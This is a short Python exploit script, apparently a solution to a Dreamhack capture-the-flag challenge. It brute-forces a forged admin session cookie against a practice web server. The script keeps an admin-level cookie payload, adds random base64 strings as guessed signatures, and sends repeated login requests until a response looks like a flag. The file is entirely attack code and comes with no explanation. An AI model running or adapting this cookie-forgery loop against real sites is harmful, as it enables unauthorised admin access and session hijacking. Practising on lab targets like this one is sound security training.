# standard imports
import requests
import os 
import binascii
import base64

url = "http://host1.dreamhack.games:8310/"
session_1 = "eyJpZHgiOjEsImxldmVsIjoiYWRtaW4iLCJuYW1lIjoiQXBwbGUiLCJ1c2VyaWQiOiJBcHBsZSJ9Fxc."

for _ in range(1,1000):
    secret_key = os.urandom(32)
    session_2 = base64.b64encode(secret_key).decode()[0:27]
    session_2 = session_2.replace("=","")


    new_cookie = session_1 + session_2

    print("trying secret_key {}" .format(session_2))

    r = requests.get(url+"login", cookies={"session":new_cookie})

    if "{" in r.text:

        print(r.text)